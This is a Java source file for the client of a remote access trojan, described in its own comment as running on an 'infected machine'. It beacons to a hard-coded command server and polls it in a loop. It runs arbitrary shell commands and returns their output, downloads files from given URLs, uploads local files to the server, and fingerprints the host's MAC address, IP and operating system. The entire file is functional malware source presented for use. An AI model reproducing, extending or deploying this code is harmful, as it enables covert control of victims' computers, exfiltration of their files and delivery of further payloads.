package client;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;

import tools.Command;
import tools.ParsedCommand;

/**
 * The main thread running on an infected machine
 * 
 * @author Yohan Chalier
 *
 */
public class Client extends Thread {
	
	// Using a domain name to be able to change IP once compiled
	// private static final String SERVER_URL = "http://rat.chalier.fr";
	private static final String SERVER_URL = "192.168.1.19";
	private static final int SERVER_PORT = 80;
	
	// Client cooldown in milliseconds
	private static final int REFRESH_COOLDOWN = 10000;
	
	private HashMap<String, Command> commands;
	
	private int id;
	
	public Client() {
		commands = new HashMap<String, Command>();
		
		commands.put("PONG", new Command(){

			@Override
			public String exec(ParsedCommand pCmd) {
				// TODO: log pong
				return null;
			}
			
		});
		
		commands.put("EXEC", new Command(){

			@Override
			public String exec(ParsedCommand pCmd) {
				
				try {
					Process p = Runtime.getRuntime().exec(pCmd.argLine());
					p.waitFor();
					BufferedReader reader = new BufferedReader(
							new InputStreamReader(p.getInputStream()));
					String line;
					StringBuilder output = new StringBuilder();
					while ((line = reader.readLine()) != null) {
						output.append(line + "\n");
					}
					sendAsync("OUT " + id, output.toString());
					
				} catch (IOException | InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				return null;
			}
			
		});
		
		// Download a file
		commands.put("DWNLD", new Command(){

			@Override
			public String exec(ParsedCommand pCmd) {
	
				try {
					download(pCmd.args[0], pCmd.args[1]);
					sendAsync("OUT File correctly downloaded.");
					
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				return null;
			}
			
		});
		
		// Upload a file
		commands.put("UPLD", new Command(){

			@Override
			public String exec(ParsedCommand pCmd) {
				try {
					
					// Reading file
					ArrayList<Byte> tmp = new ArrayList<Byte>();
					InputStream in = new FileInputStream(pCmd.args[0]);
					int c;
					while ((c = in.read()) != -1)
						tmp.add((byte) c);
					in.close();
					
					// Building payload
					byte[] payload = new byte[tmp.size()];
					for (int i = 0; i < tmp.size(); i++)
						payload[i] = tmp.get(i);
					
					// Sending request
					sendAsync("UPLD " + pCmd.args[1], payload);
					
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				return null;
			}
			
		});
		
		// ADD COMMANDS HERE
	}
	
	@Override
	public void run(){
		
		try {
			id = Integer.parseInt(send("GETID " + getIdentity()));
		} catch (NumberFormatException | SocketException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
		while (true) {
			
			String response = send("PING " + id, new byte[] {});
			ParsedCommand pCmd = new ParsedCommand(response);
			if (commands.containsKey(pCmd.cmd))
				commands.get(pCmd.cmd).exec(pCmd);

			try {
				Thread.sleep(REFRESH_COOLDOWN);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	
	private String getIdentity() throws SocketException {
		        
        // Iterating through all network card interfaces
        for (Enumeration<NetworkInterface> ifaces =
        		NetworkInterface.getNetworkInterfaces();
        		ifaces.hasMoreElements();) {
        	
            NetworkInterface iface = (NetworkInterface) ifaces.nextElement();
            
            // We omit addresses used by VirtualBox
            if (!iface.toString().contains("Virtual")) {
            	
            	// Iterating trough all addresses of the interface
            	for (Enumeration<InetAddress> inetAddrs =
            			iface.getInetAddresses();
            			inetAddrs.hasMoreElements();) {
            		
	                InetAddress inetAddr =
	                		(InetAddress) inetAddrs.nextElement();
	                
	                if (!inetAddr.isLoopbackAddress()) {
	                	
	                	// Binary representation of MAC address
	                	byte[] mac = iface.getHardwareAddress();
	                	
	                	// Printing into a string to be returned
	                	StringBuilder sb = new StringBuilder();
	            		for (int i = 0; i < mac.length; i++) {
	            			sb.append(String.format(
	            					"%02X%s",
	            					mac[i],
	            					(i < mac.length - 1) ? "-" : ""));
	            		}
	            		
	            		sb.append(" ");
	            		sb.append(inetAddr.toString());
	            		sb.append(" ");
	            		sb.append(System.getProperty("os.name"));
	            		
	            		return sb.toString();
	                }
	            }
            }
        }
        
        return null;
		
	}
	
	private String send(String request, byte[] payload) {
		Socket socket;
		
		byte[] CRLF = new byte[] {13, 10};
		
		try {
			socket = new Socket(SERVER_URL, SERVER_PORT);
		
			OutputStream out = socket.getOutputStream();
			InputStream in = socket.getInputStream();
			
			out.write(Integer.toString(payload.length).getBytes());
			out.write(CRLF);
			out.write(request.getBytes());
			out.write(CRLF);
			out.write(payload);
			
			out.flush();
			
			StringBuilder line = new StringBuilder();
			int c;
			while ((c = in.read()) != -1)
				line.append((char) c);
			
			out.close();
			in.close();
			socket.close();
			
			return line.toString();
		
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
			
		}
	}
	
	private String send(String request) {
		
		return send(request, new byte[] {});
		
	}
	
	private void sendAsync(String request, byte[] payload, Callback callback) {
		
		new Thread(new Runnable(){

			@Override
			public void run() {
				String response = send(request, payload);
				callback.run(response);
			}
			
		}).start();
		
	}
	
	private void sendAsync(String request, byte[] payload) {
		sendAsync(request, payload, new Callback(){

			@Override
			public void run(String response) {
				// TODO Auto-generated method stub
				
			}
			
		});
	}
	
	private void sendAsync(String request, String payload) {
		sendAsync(request, payload.getBytes());
	}
	
	private void sendAsync(String request) {
		sendAsync(request, "");
	}
	
	private interface Callback {
		public void run(String response);
	}
	
	public static void download(String fileURL, String fileName)
			throws IOException {
		
		final int BUFFER_SIZE = 4096;
		
		URL url = new URL(fileURL);
        URLConnection conn = url.openConnection();

        // Opens input stream from the HTTP connection
        InputStream inputStream = conn.getInputStream();
         
        // Opens an output stream to save into file
        FileOutputStream outputStream = new FileOutputStream(fileName);
 
        int bytesRead = -1;
        byte[] buffer = new byte[BUFFER_SIZE];
        while ((bytesRead = inputStream.read(buffer)) != -1) {
            outputStream.write(buffer, 0, bytesRead);
        }

        outputStream.close();
        inputStream.close();
	}

}
